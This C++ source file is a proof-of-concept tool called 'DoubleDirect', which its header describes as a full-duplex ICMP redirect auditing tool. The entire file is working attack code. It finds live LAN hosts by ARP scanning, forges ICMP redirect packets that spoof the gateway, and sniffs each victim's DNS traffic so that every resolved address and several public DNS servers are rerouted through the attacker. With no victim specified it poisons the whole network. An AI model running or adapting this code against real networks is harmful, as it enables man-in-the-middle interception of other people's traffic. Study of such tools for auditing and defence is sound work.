/*
 * DoubleDirect - Full-Duplex ICMP Redirect Auditing Tool - doubledirect_poc.cpp
 * Zimperium assumes no responsibility for any damage caused by using this software.
 * Permitted for educational or auditing purposes only.
 * Use at your own risk
 *
 * Author: larry
 */

#include <iostream>
#include <fstream>
#include <string>
#include <map>
#include <vector>
#include <getopt.h>
#include <pthread.h>
#include <crafter.h>

static void printUsage(const std::string& progname) {
    std::cout << "[#] Usage: " << progname << " [options] " << std::endl;
    std::cout << "[#] Options: " << std::endl;
    std::cout << "    -i, --interface    Interface" << std::endl;
    std::cout << "    -g, --new-gateway  New gateway for the poisoned destination" << std::endl;
    std::cout << "    -s, --source       Source IP address of the ICMP message" << std::endl;
    std::cout << "    -v, --victim       Victim IP address" << std::endl;
}

// Local interface info
typedef struct {
    // Broadcast
    struct in_addr bcast;
    // Network Mask
    struct in_addr nmask;
} ifcfg_t;

// Grabs local network interface information and stores in a ifcfg_t
// defined in network.h, returns 0 on success -1 on failure
int get_local_info(const std::string& interface, ifcfg_t *ifcfg) {
    int rsock = socket(PF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface.c_str(), IF_NAMESIZE);
    if((ioctl(rsock, SIOCGIFBRDADDR, &ifr)) == -1){
        perror("ioctl():");
        return -1;
    }
    memcpy(&ifcfg->bcast, &(*(struct sockaddr_in *)&ifr.ifr_broadaddr).sin_addr, 4);

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface.c_str(), IF_NAMESIZE);
    if((ioctl(rsock, SIOCGIFNETMASK, &ifr)) == -1){
        perror("ioctl():");
        return -1;
    }
    memcpy(&ifcfg->nmask.s_addr, &(*(struct sockaddr_in *)&ifr.ifr_netmask).sin_addr, 4);

    close(rsock);
    return 0;
}

std::string get_string_ip(in_addr nip) {
    char str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(nip.s_addr), str, INET_ADDRSTRLEN);
    return std::string(str);
}

std::string get_string_ip(in_addr_t nip) {
    char str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &nip, str, INET_ADDRSTRLEN);
    return std::string(str);
}

// Discover hosts on the local LAN
std::map<std::string, std::string> arp_ping_discover(const std::vector<std::string>& hosts, const std::string& iface) {
    /* Get the IP address associated to the interface */
    std::string MyIP = Crafter::GetMyIP(iface);
    /* Get the MAC Address associated to the interface */
    std::string MyMAC = Crafter::GetMyMAC(iface);

    /* --------- Common data to all headers --------- */

    Crafter::Ethernet ether_header;

    ether_header.SetSourceMAC(MyMAC);
    ether_header.SetDestinationMAC("ff:ff:ff:ff:ff:ff");

    Crafter::ARP arp_header;

    arp_header.SetOperation(Crafter::ARP::Request);
    arp_header.SetSenderIP(MyIP);
    arp_header.SetSenderMAC(MyMAC);

    /* ---------------------------------------------- */

    /* Create a container of packet pointers to hold all the ARP requests */
    std::vector<Crafter::Packet*> request_packets;

    /* Iterate to access each string that defines an IP address */
    for(size_t i = 0 ; i < hosts.size() ; ++i) {

        arp_header.SetTargetIP(hosts[i]);

        /* Create a packet on the heap */
        Crafter::Packet* packet = new Crafter::Packet;

        /* Push the layers */
        packet->PushLayer(ether_header);
        packet->PushLayer(arp_header);

        /* Finally, push the packet into the container */
        request_packets.push_back(packet);
    }

    std::vector<Crafter::Packet*> replies_packets(request_packets.size());

    SendRecv(request_packets.begin(), request_packets.end(), replies_packets.begin(), iface, 0.1, 4, 48);

    std::vector<Crafter::Packet*>::iterator it_pck;
    int counter = 0;
    std::map<std::string, std::string> pair_addr;
    for(it_pck = replies_packets.begin() ; it_pck < replies_packets.end() ; it_pck++) {
        Crafter::Packet* reply_packet = (*it_pck);
        /* Check if the pointer is not NULL */
        if(reply_packet) {
            /* Get the ARP layer of the replied packet */
            Crafter::ARP* arp_layer = reply_packet->GetLayer<Crafter::ARP>();
            /* Print the Source IP */
            std::cout << "[@] Host " << arp_layer->GetSenderIP() << " is up with "
                    "MAC address " << arp_layer->GetSenderMAC() << std::endl;
            pair_addr.insert(std::make_pair(arp_layer->GetSenderIP(), arp_layer->GetSenderMAC()));
            counter++;
        }

    }

    std::cout << "[@] " << counter << " hosts up. " << std::endl;

    /* Delete the container with the ARP requests */
    for(it_pck = request_packets.begin() ; it_pck < request_packets.end() ; it_pck++)
        delete (*it_pck);

    /* Delete the container with the responses  */
    for(it_pck = replies_packets.begin() ; it_pck < replies_packets.end() ; it_pck++)
        delete (*it_pck);
    return pair_addr;
}


// Get gateway MAC
static std::string getGatewayMac(const std::string& iface) {
    // Set default values
    std::string gw_ip("0.0.0.0"), gw_mac("00:00:00:00:00:00");
    char a[16];
    char buf[1024];
    uint32_t b, c, r;
    FILE *route_fd = fopen("/proc/net/route", "r");
    if (route_fd == NULL) return gw_mac;

    fseek(route_fd, 0, 0);
    while (fgets(buf, sizeof(buf), route_fd)) {
        r = sscanf(buf, "%s %x %x", a, &b, &c);
        if ((r == 3) && (strcmp(a, iface.c_str()) == 0) && (b == 0)) {
            struct in_addr in;
            in.s_addr = c;
            gw_ip = std::string(inet_ntoa(in));
            break;
        }
    }

    fclose(route_fd);

    std::string ip_addr_arp;
    std::string hw_addr_arp;
    std::string device_arp;
    std::string dummy;

    std::ifstream arp_table ("/proc/net/arp");
    std::string line;
    std::getline (arp_table,line);

    typedef std::vector<std::pair<std::string, std::string> > addr_pair_cont;
    addr_pair_cont addr_pairs;

    if (arp_table.is_open()) {
        while ( arp_table.good() ) {
            arp_table >> ip_addr_arp;
            arp_table >> dummy;
            arp_table >> dummy;
            arp_table >> hw_addr_arp;
            arp_table >> dummy;
            arp_table >> device_arp;
            // Check if this entry is the gateway
            if(ip_addr_arp == gw_ip) {
                gw_mac = hw_addr_arp;
                break;
            }
        }
    }

    arp_table.close();

    return gw_mac;
}

// Get gateway IP
static std::string getGatewayIp(const std::string& iface) {
    std::string gw_addr("");
    char a[16];
    char buf[1024];
    uint32_t b, c, r;
    FILE *route_fd = fopen("/proc/net/route", "r");
    if (route_fd == NULL) return "";

    fseek(route_fd, 0, 0);
    while (fgets(buf, sizeof(buf), route_fd)) {
        r = sscanf(buf, "%s %x %x", a, &b, &c);
        if ((r == 3) && (strcmp(a, iface.c_str()) == 0) && (b == 0)) {
            struct in_addr in;
            in.s_addr = c;
            gw_addr = std::string(inet_ntoa(in));
            break;
        }
    }

    fclose(route_fd);

    return gw_addr;
}

// Structure to hold parameters of the ICMP redirect attack
struct IcmpRedirParameters {
	// Interface
    std::string _interface;
    // Victim IP address
    std::string _victim;
    // Destination we want to poison
    std::string _destination;
    // Net gateway
    std::string _new_gateway;
    // Source of the ICMP redirect message
    std::string _source_ip;
};

// Attack finished
bool finish = false;

// Global Sniffer pointer
std::vector<Crafter::Sniffer*> sniffers;

// List of poisoned entries (one for each destination)
std::map<std::string, IcmpRedirParameters*> poisoned_entries;
pthread_mutex_t entries_mutex;

// Function for handling a CTRL-C
void ctrl_c(int dummy) {
	// Signal finish of the attack
	finish = true;
	// Cancel the sniffing thread
	for(size_t i = 0 ; i < sniffers.size() ; ++i) {
	    sniffers[i]->Cancel();
	}
}

Crafter::Packet* createIcmpPacket(const IcmpRedirParameters* parameters) {
    // Create an IP header
    Crafter::IP ip_header;
    ip_header.SetSourceIP(parameters->_source_ip);
    ip_header.SetDestinationIP(parameters->_victim);

    // Create an ICMP header
    Crafter::ICMP icmp_header;
    // ICMP redirect message
    icmp_header.SetType(Crafter::ICMP::EchoRedirect);
    // Code for redirect to host
    icmp_header.SetCode(1);
    // Set gateway (put attacker's IP here)
    icmp_header.SetGateway(parameters->_new_gateway);

    // Original packet, this should contain the address we want to poison
    Crafter::IP orig_ip_header;
    orig_ip_header.SetSourceIP(parameters->_victim);
    orig_ip_header.SetDestinationIP(parameters->_destination);

    // Create an UDP header. This could be any protocol (ICMP, UDP, TCP, etc)
    Crafter::UDP orig_udp_header;
    orig_udp_header.SetDstPort(53);
    orig_udp_header.SetSrcPort(Crafter::RNG16());

    // Craft the packet and sent it every 3 seconds
    Crafter::Packet* redir_packet = new Crafter::Packet(ip_header / icmp_header / orig_ip_header / orig_udp_header);

    // Return created packet
    return redir_packet;
}

// Function to send a couple of ICMP redirect messages
void* icmpRedirectAttack(void* arg) {
	// Get attack parameters
	const IcmpRedirParameters* parameters = reinterpret_cast<const IcmpRedirParameters*>(arg);

	// Create packet
	Crafter::Packet* redir_packet = createIcmpPacket(parameters);

	// Send 3 packets
    for(int i = 0 ; i < 3 ; ++i) {
        redir_packet->Send();
        sleep(3);
    }

    return 0;
}

void startIcmpRedirectAttack(IcmpRedirParameters& parameters) {
	pthread_t tid;
	pthread_create(&tid, 0, icmpRedirectAttack, reinterpret_cast<void*>(&parameters));
	pthread_detach(tid);
}

void startIcmpRedirectAttack(IcmpRedirParameters& parameters, const std::string& destination) {
	IcmpRedirParameters* new_parameters = new IcmpRedirParameters(parameters);
	new_parameters->_destination = destination;

	// Save it in global list of poisoned entries
	pthread_mutex_lock(&entries_mutex);
	poisoned_entries.insert(std::make_pair(new_parameters->_victim + ":" + new_parameters->_destination, new_parameters));
	pthread_mutex_unlock(&entries_mutex);

	// Start attack
	startIcmpRedirectAttack(*new_parameters);
}

void DnsWatcher(Crafter::Packet* sniff_packet, void* user) {
	IcmpRedirParameters* parameters = reinterpret_cast<IcmpRedirParameters*>(user);

    /* Get the Ethernet Layer */
    Crafter::Ethernet* ether_layer = GetEthernet(*sniff_packet);

    /* Get the IP layer */
    Crafter::IP* ip_layer = GetIP(*sniff_packet);

    /* Get the UDP layer */
    Crafter::UDP* udp_layer = GetUDP(*sniff_packet);

    /* Checks if the source MAC is not mine */
    if(ether_layer->GetSourceMAC() != getGatewayMac(parameters->_interface)) {

		// Checks if the packet is coming from the server
		if(ip_layer->GetSourceIP() == parameters->_victim) {
			// Get the RawLayer
			Crafter::RawLayer* raw_layer = GetRawLayer(*sniff_packet);

			// Create a DNS header
			Crafter::DNS dns_req;
			// And decode it from a raw layer
			dns_req.FromRaw(*raw_layer);

			// Check if the DNS packet is a query and there is a question on it.
			if( (dns_req.GetQRFlag() == 0) && (dns_req.Queries.size() > 0) ) {
					// Get the host name to be resolved
					std::string hostname = dns_req.Queries[0].GetName();
					// Print information
					std::cout << "[@] Query detected -> Host Name = " << hostname << std::endl;
			}

		// ...or coming from the server (better)
		} else if (ip_layer->GetDestinationIP() == parameters->_victim) {

			// Get the RawLayer
			Crafter::RawLayer* raw_layer = GetRawLayer(*sniff_packet);

			// Create a DNS header
			Crafter::DNS dns_res;
			// And decode it from a raw layer
			dns_res.FromRaw(*raw_layer);

			// Check if we have responses on the DNS packet.
			if(dns_res.Answers.size() > 0) {
				for(size_t i = 0 ; i < dns_res.Answers.size() ; ++i) {
					if(dns_res.Answers[i].GetType() == Crafter::DNS::TypeA) {
						// Get the host name to be resolved
						std::string ip = dns_res.Answers[i].GetRData();
						// Print information
						std::cout << "[@] Response detected -> IP address = " << ip << std::endl;
						// Poison this address
						startIcmpRedirectAttack(*parameters, ip);
					}
				}
			}
		}
    }
}

// Function to poison a fixed list of DNS servers
void* poisonDnsServers(void* user) {
	IcmpRedirParameters* redirect_parameters = reinterpret_cast<IcmpRedirParameters*>(user);

	while(not finish) {
		// HardCode DNS servers we want to redirect to our machine
		startIcmpRedirectAttack(*redirect_parameters, getGatewayIp(redirect_parameters->_interface)); // Gateway
		startIcmpRedirectAttack(*redirect_parameters, "8.8.8.8"); // GOOGLE
		startIcmpRedirectAttack(*redirect_parameters, "8.8.4.4"); // GOOGLE
		startIcmpRedirectAttack(*redirect_parameters, "208.67.222.222"); // OpenDNS
		startIcmpRedirectAttack(*redirect_parameters, "208.67.220.220"); // OpenDNS
		sleep(10);
	}

	return 0;
}

int main(int argc, char* argv[]) {
    // Print header
    std::cout << "[#] ***** ZIMPERIUM - DoubleDirect :: Full-Duplex ICMP Redirect Audit Tool *****" << std::endl;

    // Program name
    std::string progname(argv[0]);
    // Check arguments
    if(argc < 2) {
        printUsage(progname);
        return 1;
    }

    signal(SIGINT, ctrl_c);
    signal(SIGTERM, ctrl_c);

    // Parameters
    std::string interface, victim_ip, new_gateway, source_ip;
    // Victim's IPs
    std::vector<std::string> victims;

    int c;
    // Define options
    static struct option long_options[] = {
        {"interface",   1, 0, 'i'},
        {"new-gateway", 1, 0, 'g'},
        {"victim",      1, 0, 'v'},
        {"source",      1, 0, 's'},
        {NULL,    0, 0, 0}
    };

    int option_index = 0;
    while ((c = getopt_long(argc, argv, "i:v:g:s:",long_options, &option_index)) != -1) {
        switch (c) {
        case 'i':
        	interface = std::string(optarg);
            break;
        case 'v':
            victim_ip = std::string(optarg);
            break;
        case 'g':
        	new_gateway = std::string(optarg);
            break;
        case 's':
        	source_ip = std::string(optarg);
            break;
        case '?':
            printUsage(progname);
            return 1;
            break;
        default:
            printUsage(progname);
            return 1;
        }
    }

    if(interface.size() == 0) {
        std::cout << "[#] Error: Missing interface " << std::endl;
        printUsage(progname);
        return 1;
    }

    if(victim_ip.size() == 0) {
        std::cout << "[#] Missing victim IP address. Poisoning the entire network" << std::endl;

        // Total hosts
        std::vector<std::string> total_hosts;

        // Get local information of the interface
        ifcfg_t local_info;
        get_local_info(interface, &local_info);

        // Get first IP address
        in_addr_t first_ip = local_info.nmask.s_addr & local_info.bcast.s_addr;
        in_addr_t delta_net = ~ntohl(local_info.nmask.s_addr);

        // Create list of ignored IPs addresses
        std::set<std::string> ignored_ips;
        ignored_ips.insert(getGatewayIp(interface));
        ignored_ips.insert(Crafter::GetMyIP(interface));
        ignored_ips.insert(get_string_ip(first_ip));

        // Loop over IPs addresses on the network
        for(size_t i = 0 ; i < delta_net ; ++i) {
            // Get destination IP address
            in_addr_t nip = ntohl(ntohl(first_ip) + i);
            std::string ip = get_string_ip(nip);

            // Only attack IPs which are not on the ignore list
            if(ignored_ips.find(ip) == ignored_ips.end()) {
                total_hosts.push_back(ip);
            }
        }

        // Get hosts UP
        std::map<std::string,std::string> host_up = arp_ping_discover(total_hosts, interface);

        // Set as targets only alive hosts
        for(std::map<std::string,std::string>::const_iterator it = host_up.begin() ; it != host_up.end() ; ++it) {
            victims.push_back((*it).first);
        }
    } else {
        // Push only one victim
        victims.push_back(victim_ip);

        // Print attack's parameters
        std::cout << "[#] Attack parameters : " << std::endl;
        std::cout << "    [+] Interface : " << interface << std::endl;
        std::cout << "    [+] Victim IP address : " << victim_ip << std::endl;
    }

    // Try to get the IP of the gateway
    std::string gw_ip = getGatewayIp(interface);
    // By default the source IP address of the message is the current gateway
    if(source_ip.length() == 0) source_ip = gw_ip;

    if(gw_ip.size() == 0) {
        std::cout << "[#] Error: Interface " << interface << " don't have an associated gateway" << std::endl;
        return 1;
    }

    // Get MAC address of the gateway
    std::string gw_mac = getGatewayMac(interface);

    std::cout << "[#] Gateway parameters : " << std::endl;
    std::cout << "    [+] Gateway IP address : " << gw_ip << std::endl;
    std::cout << "    [+] Gateway MAC address : " << gw_mac << std::endl;

    std::string my_ip = Crafter::GetMyIP(interface);
    // By default set attacker's IP as the new gateway
    if(new_gateway.length() == 0) new_gateway = my_ip;

    std::cout << "[#] My parameters : " << std::endl;
    std::cout << "    [+] My IP address : " << my_ip << std::endl;

    for(size_t i = 0 ; i < victims.size() ; ++i) {
        // Get victim IP
        std::string victim = victims[i];

        // Setup attacks parameters
        IcmpRedirParameters* redirect_parameters = new IcmpRedirParameters;

        // Interface
        redirect_parameters->_interface = interface;
        // Victim IP address
        redirect_parameters->_victim = victim;
        // Net gateway
        redirect_parameters->_new_gateway = new_gateway;
        // Source of the ICMP redirect message
        redirect_parameters->_source_ip = source_ip;

        pthread_mutex_init(&entries_mutex, 0);

        pthread_t dns_poison_id;
        pthread_create(&dns_poison_id, 0, poisonDnsServers, reinterpret_cast<void*>(redirect_parameters));
        pthread_detach(dns_poison_id);

        // Create a sniffer
        Crafter::Sniffer* sniff = new Crafter::Sniffer("udp and host " + victim + " and port 53", interface, DnsWatcher);

        // Now start the main sniffer loop
        void* sniffer_arg = static_cast<void*>(redirect_parameters);
        sniff->Spawn(-1, sniffer_arg);

        // Save sniffer reference
        sniffers.push_back(sniff);
    }

    // Wait
    while(not finish) sleep(1);

    std::cout << "[#] Finishing ICMP redirect attack..." << std::endl;
	std::cout << "[#] Fixing route table on victim's machine. Number of poisoned entries = " << poisoned_entries.size() << std::endl;

	// Threads
	std::vector<Crafter::Packet*> fix_packets;
	// Protect entries
	pthread_mutex_lock(&entries_mutex);

	// Loop over all entries
	for(std::map<std::string, IcmpRedirParameters*>::const_iterator it = poisoned_entries.begin() ;
			it != poisoned_entries.end() ; ++it) {
		// Get parameters
		IcmpRedirParameters* parameters = it->second;
		std::cout << "  [+] Fixing table for destination : " << it->first << std::endl;
		parameters->_source_ip = parameters->_new_gateway;
		parameters->_new_gateway = getGatewayIp(parameters->_interface);

		// Push packet
		fix_packets.push_back(createIcmpPacket(parameters));
	}

	// Send all the packets, 3 times
	for(int i = 0 ; i < 3 ; ++i) {
		Crafter::Send(fix_packets.begin(), fix_packets.end(), interface, 16);
		sleep(3);
	}

	pthread_mutex_unlock(&entries_mutex);
    pthread_mutex_destroy(&entries_mutex);

    std::cout << "[#] Finishing fixing route table on victim's machine" << std::endl;

    return 0;
}


